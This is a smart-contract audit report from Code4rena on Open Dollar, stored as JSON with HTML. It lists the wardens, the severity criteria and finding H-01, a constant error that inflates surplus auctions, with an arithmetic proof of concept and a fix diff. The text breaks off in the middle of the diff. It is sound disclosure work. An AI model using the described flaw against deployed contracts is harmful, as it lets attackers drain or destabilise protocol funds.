{
  "circa": {
    "title": "Open Dollar",
    "sponsor": "Open Dollar",
    "slug": "2023-10-opendollar",
    "date": "2023-12-20",
    "findings": "https://github.com/code-423n4/2023-10-opendollar-findings/issues",
    "contest": 297
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit outlined in this document, C4 conducted an analysis of the Open Dollar smart contract system written in Solidity. The audit took place between October 18—October 25 2023.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>80 Wardens contributed reports to Open Dollar:</p>\n<ol>\n<li><a href=\"https://code4rena.com/@hals\">hals</a></li>\n<li><a href=\"https://code4rena.com/@MrPotatoMagic\">MrPotatoMagic</a></li>\n<li><a href=\"https://code4rena.com/@yashar\">yashar</a></li>\n<li><a href=\"https://code4rena.com/@klau5\">klau5</a></li>\n<li><a href=\"https://code4rena.com/@nmirchev8\">nmirchev8</a></li>\n<li><a href=\"https://code4rena.com/@Saintcode_\">Saintcode_</a></li>\n<li><a href=\"https://code4rena.com/@T1MOH\">T1MOH</a></li>\n<li><a href=\"https://code4rena.com/@falconhoof\">falconhoof</a></li>\n<li><a href=\"https://code4rena.com/@tnquanghuy0512\">tnquanghuy0512</a></li>\n<li><a href=\"https://code4rena.com/@Haipls\">Haipls</a></li>\n<li><a href=\"https://code4rena.com/@kutugu\">kutugu</a></li>\n<li><a href=\"https://code4rena.com/@hunter_w3b\">hunter_w3b</a></li>\n<li><a href=\"https://code4rena.com/@immeas\">immeas</a></li>\n<li><a href=\"https://code4rena.com/@ZanyBonzy\">ZanyBonzy</a></li>\n<li><a href=\"https://code4rena.com/@pep7siup\">pep7siup</a></li>\n<li><a href=\"https://code4rena.com/@0xprinc\">0xprinc</a></li>\n<li><a href=\"https://code4rena.com/@fouzantanveer\">fouzantanveer</a></li>\n<li><a href=\"https://code4rena.com/@twicek\">twicek</a></li>\n<li><a href=\"https://code4rena.com/@0x6d6164616e\">0x6d6164616e</a></li>\n<li><a href=\"https://code4rena.com/@perseus\">perseus</a></li>\n<li><a href=\"https://code4rena.com/@twcctop\">twcctop</a></li>\n<li><a href=\"https://code4rena.com/@Baki\">Baki</a> (<a href=\"https://code4rena.com/@Viraz\">Viraz</a> and <a href=\"https://code4rena.com/@supernova\">supernova</a>)</li>\n<li><a href=\"https://code4rena.com/@Tendency\">Tendency</a></li>\n<li><a href=\"https://code4rena.com/@Arz\">Arz</a></li>\n<li><a href=\"https://code4rena.com/@lsaudit\">lsaudit</a></li>\n<li><a href=\"https://code4rena.com/@xAriextz\">xAriextz</a></li>\n<li><a href=\"https://code4rena.com/@COSMIC-BEE-REACH\">COSMIC-BEE-REACH</a> (<a href=\"https://code4rena.com/@pxng0lin\">pxng0lin</a>, <a href=\"https://code4rena.com/@0xarno\">0xarno</a>, and <a href=\"https://code4rena.com/@solsaver\">solsaver</a>)</li>\n<li><a href=\"https://code4rena.com/@Krace\">Krace</a></li>\n<li><a href=\"https://code4rena.com/@0xhacksmithh\">0xhacksmithh</a></li>\n<li><a href=\"https://code4rena.com/@bitsurfer\">bitsurfer</a></li>\n<li><a href=\"https://code4rena.com/@spark\">spark</a></li>\n<li><a href=\"https://code4rena.com/@josephdara\">josephdara</a></li>\n<li><a href=\"https://code4rena.com/@btk\">btk</a></li>\n<li><a href=\"https://code4rena.com/@phoenixV110\">phoenixV110</a></li>\n<li><a href=\"https://code4rena.com/@0xMosh\">0xMosh</a></li>\n<li><a href=\"https://code4rena.com/@nican0r\">nican0r</a></li>\n<li><a href=\"https://code4rena.com/@0xVolcano\">0xVolcano</a></li>\n<li><a href=\"https://code4rena.com/@mrudenko\">mrudenko</a></li>\n<li><a href=\"https://code4rena.com/@0xPsuedoPandit\">0xPsuedoPandit</a></li>\n<li><a href=\"https://code4rena.com/@Stormreckson\">Stormreckson</a></li>\n<li><a href=\"https://code4rena.com/@ni8mare\">ni8mare</a></li>\n<li><a href=\"https://code4rena.com/@Kaysoft\">Kaysoft</a></li>\n<li><a href=\"https://code4rena.com/@fibonacci\">fibonacci</a></li>\n<li><a href=\"https://code4rena.com/@holydevoti0n\">holydevoti0n</a></li>\n<li><a href=\"https://code4rena.com/@JCK\">JCK</a></li>\n<li><a href=\"https://code4rena.com/@Bughunter101\">Bughunter101</a></li>\n<li><a href=\"https://code4rena.com/@Beosin\">Beosin</a></li>\n<li><a href=\"https://code4rena.com/@clara\">clara</a></li>\n<li><a href=\"https://code4rena.com/@jauvany\">jauvany</a></li>\n<li><a href=\"https://code4rena.com/@SAAJ\">SAAJ</a></li>\n<li><a href=\"https://code4rena.com/@wei3erHase\">wei3erHase</a></li>\n<li><a href=\"https://code4rena.com/@0xweb3boy\">0xweb3boy</a></li>\n<li><a href=\"https://code4rena.com/@Myd\">Myd</a></li>\n<li><a href=\"https://code4rena.com/@0xbrett8571\">0xbrett8571</a></li>\n<li><a href=\"https://code4rena.com/@HChang26\">HChang26</a></li>\n<li><a href=\"https://code4rena.com/@merlin\">merlin</a></li>\n<li><a href=\"https://code4rena.com/@0xmystery\">0xmystery</a></li>\n<li><a href=\"https://code4rena.com/@m4k2\">m4k2</a></li>\n<li><a href=\"https://code4rena.com/@0xAadi\">0xAadi</a></li>\n<li><a href=\"https://code4rena.com/@niki\">niki</a></li>\n<li><a href=\"https://code4rena.com/@0xsurena\">0xsurena</a></li>\n<li><a href=\"https://code4rena.com/@cryptothemex\">cryptothemex</a></li>\n<li><a href=\"https://code4rena.com/@0xWaitress\">0xWaitress</a></li>\n<li><a href=\"https://code4rena.com/@Giorgio\">Giorgio</a></li>\n<li><a href=\"https://code4rena.com/@ge6a\">ge6a</a></li>\n<li><a href=\"https://code4rena.com/@Greed\">Greed</a></li>\n<li><a href=\"https://code4rena.com/@0xlemon\">0xlemon</a></li>\n<li><a href=\"https://code4rena.com/@0x11singh99\">0x11singh99</a></li>\n<li><a href=\"https://code4rena.com/@naman1778\">naman1778</a></li>\n<li><a href=\"https://code4rena.com/@dharma09\">dharma09</a></li>\n<li><a href=\"https://code4rena.com/@unique\">unique</a></li>\n<li><a href=\"https://code4rena.com/@nailkhalimov\">nailkhalimov</a></li>\n<li><a href=\"https://code4rena.com/@0xDemon\">0xDemon</a></li>\n<li><a href=\"https://code4rena.com/@okolicodes\">okolicodes</a></li>\n<li><a href=\"https://code4rena.com/@Al-Qa-qa\">Al-Qa-qa</a></li>\n<li><a href=\"https://code4rena.com/@8olidity\">8olidity</a></li>\n<li><a href=\"https://code4rena.com/@eeshenggoh\">eeshenggoh</a></li>\n</ol>\n<p>This audit was judged by <a href=\"https://code4rena.com/@MiloTruck\">MiloTruck</a>.</p>\n<p>Final report assembled by PaperParachute.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 17 unique vulnerabilities. Of these vulnerabilities, 2 received a risk rating in the category of HIGH severity and 15 received a risk rating in the category of MEDIUM severity.</p>\n<p>Additionally, C4 analysis included 25 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 8 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2023-10-opendollar\">C4 Open Dollar repository</a>, and is composed of 11 smart contracts written in the Solidity programming language and includes 998 lines of Solidity code.</p>\n<p>In addition to the known issues identified by the project team, a Code4rena bot race was conducted at the start of the audit. The winning bot, <strong>vuln-detector</strong> from warden <a href=\"https://code4rena.com/@oualidpro\">oualidpro</a>, generated the <a href=\"https://gist.github.com/code423n4/ff4868d6946db4c2242a7c5594baece6\">Automated Findings report</a> and all findings therein were classified as out of scope.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>, specifically our section on <a href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\">Severity Categorization</a>.</p>\n<h1 id=\"high-risk-findings-2\" style=\"position:relative;\"><a href=\"#high-risk-findings-2\" aria-label=\"high risk findings 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (2)</h1>\n<h2 id=\"h-01-incorrect-calculations-for-surplus-auction-creation-cause-massive-surplus-imbalances\" style=\"position:relative;\"><a href=\"#h-01-incorrect-calculations-for-surplus-auction-creation-cause-massive-surplus-imbalances\" aria-label=\"h 01 incorrect calculations for surplus auction creation cause massive surplus imbalances permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/26\">[H-01] Incorrect calculations for Surplus Auction creation cause massive surplus imbalances</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/26\">falconhoof</a>, also found by pep7siup (<a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/384\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/368\">2</a>), <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/281\">tnquanghuy0512</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/206\">0x6d6164616e</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/186\">twicek</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/174\">immeas</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/83\">T1MOH</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/78\">Krace</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/295\">Baki</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/214\">bitsurfer</a>, and <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/118\">Beosin</a></em></p>\n<p>There are two big issues in <code>AccountingEngine.sol::auctionSurplus()</code> when calculating values for the creating a Surplus Auction; specifically in <a href=\"https://github.com/open-dollar/od-contracts/blob/dev/src/contracts/AccountingEngine.sol#L213-L217\">Lines 213 - 217</a>.</p>\n<ol>\n<li>The first issue is the <code>if</code> statement at <a href=\"https://github.com/open-dollar/od-contracts/blob/dev/src/contracts/AccountingEngine.sol#L213-L217\">line 213</a> which incorrectly checks if <code>_params.surplusTransferPercentage</code> is less than <code>ONE_HUNDRED_WAD</code> when it should check if it is less than <code>WAD</code>.</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (_params.surplusTransferPercentage &lt; ONE_HUNDRED_WAD) {</span></span></code></pre>\n<p>The maximum value for <code>_params.surplusTransferPercentage</code>, as checked by the function at <a href=\"https://github.com/open-dollar/od-contracts/blob/dev/src/contracts/AccountingEngine.sol#L199\">line 199</a>, is <code>1e18</code> so the check at <a href=\"https://github.com/open-dollar/od-contracts/blob/dev/src/contracts/AccountingEngine.sol#L213-L217\">line 213</a> will always return <code>TRUE</code>.</p>\n<p>However, the check should return <code>FALSE</code> when <code>_params.surplusTransferPercentage</code> is <code>1e18</code> or <code>100%</code> because in that case an auction shouldn’t be created; rather the full <code>surplusAmount</code> should be transferred to <code>extraSurplusReceiver</code> in the next code block.</p>\n<ol start=\"2\">\n<li>The second issue is the use of <code>ONE_HUNDRED_WAD</code> to calculate <code>_amountToSell</code> at <a href=\"https://github.com/open-dollar/od-contracts/blob/dev/src/contracts/AccountingEngine.sol#L213-L217\">Line 215</a> which results in a hugely inflated figure in the newly created surplus auction.</li>\n</ol>\n<p>The use of <code>ONE_HUNDRED_WAD</code> causes the calculated figure to be <code>100 times</code> greater than it should be.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    _amountToSell: _params.surplusAmount.wmul(ONE_HUNDRED_WAD - _params.surplusTransferPercentage)</span></span></code></pre>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Issue 1. For the first issue; when <code>_params.surplusTransferPercentage</code> is <code>100%</code>, a ghost surplus Auction will be created and the entire <code>surplusAmount</code> amount will also be sent to the <code>extraSurplusReceiver</code> essentially double-counting a large amount of the surplus. This double accounting can destabilise the system and lead to underflows elsewhere.</p>\n<p>Issue 2. Surplus auctions are created with massively inflated figures for <code>_amountToSell</code>. This has the potential to cause massive price imbalances and crash the protocol. There is potential here for a malicious actor to leverage the vulnerability to their advantage by creating lots of false surplus in system coins which they purchase cheaply.</p>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The following combines both issues into one PoC to show the worst case scenario.</p>\n<p>Given the following values and assuming the initial all checks pass in function before reaching Line 213 <code>AccountingEngine.sol::auctionSurplus()</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">WAD = 1e18</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">surplusTransferPercentage = 1e18 (representative of 100%)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">surplusAmount = 3e18</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">ONE_HUNDRED_WAD = 100e18</span></span></code></pre>\n<p>The following condition at Line 213 will always return TRUE:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">if (_params.surplusTransferPercentage &lt; ONE_HUNDRED_WAD)</span></span></code></pre>\n<p>So an auction will be created with <code>_amountToSell</code> 100 times higher than it should be:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    _amountToSell: _params.surplusAmount.wmul(ONE_HUNDRED_WAD - _params.surplusTransferPercentage),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Returns 297e18; where coin surplusAmount is only 3e18:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">_amountToSell = 3e18 * (100e18 - 1e18) / 1e18</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">              = 3e18 * 99e18 / 1e18</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">              = 297e18</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">              = 297 WAD</span></span></code></pre>\n<p>Following this, a coin amount of <code>surplusAmount</code> is also sent to the <code>extraSurplusReceiver</code> calculated in <a href=\"https://github.com/open-dollar/od-contracts/blob/dev/src/contracts/AccountingEngine.sol#L224-L231\">Lines 224-231</a> which is actually the intended behaviour.</p>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Foundry</p>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Update the function on the two affected lines to use <code>WAD</code> instead of <code>ONE_HUNDRED_WAD</code> as:</p>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  function auctionSurplus() external returns (uint256 _id) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    if(_params.surplusTransferPercentage &gt; WAD) revert AccEng_surplusTransferPercentOverLimit();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    if (_params.surplusAmount == 0) revert AccEng_NullAmount();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    if (extraSurplusReceiver == address(0)) revert AccEng_NullSurplusReceiver();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    if (block.timestamp &lt; lastSurplusTime + _params.surplusDelay) revert AccEng_SurplusCooldown();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint256 _coinBalance = safeEngine.coinBalance(address(this));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint256 _debtBalance = safeEngine.debtBalance(address(this));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (_coinBalance, _debtBalance) = _settleDebt(_coinBalance, _debtBalance, _unqueuedUnauctionedDebt(_debtBalance));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    if (_coinBalance &lt; _debtBalance + _params.surplusAmount + _params.surplusBuffer) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      revert AccEng_InsufficientSurplus();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    // auction surplus percentage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-   if (_params.surplusTransferPercentage &lt; ONE_HUNDRED_WAD) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   if (_params.surplusTransferPercentage &lt; WAD) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      _id = surplusAuctionHouse.startAuction({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        _amountToSell: _params.surplusAmount.wmul(ONE_HUNDRED_WAD - _params.surplusTransferPercentage),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        _amountToSell: _params.surplusAmount.wmul(WAD - _params.surplusTransferPercentage),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        _initialBid: 0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      lastSurplusTime = block.timestamp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      emit AuctionSurplus(_id, 0, _params.surplusAmount.wmul(ONE_HUNDRED_WAD - _params.surplusTransferPercentage));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    // transfer surplus percentage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    if 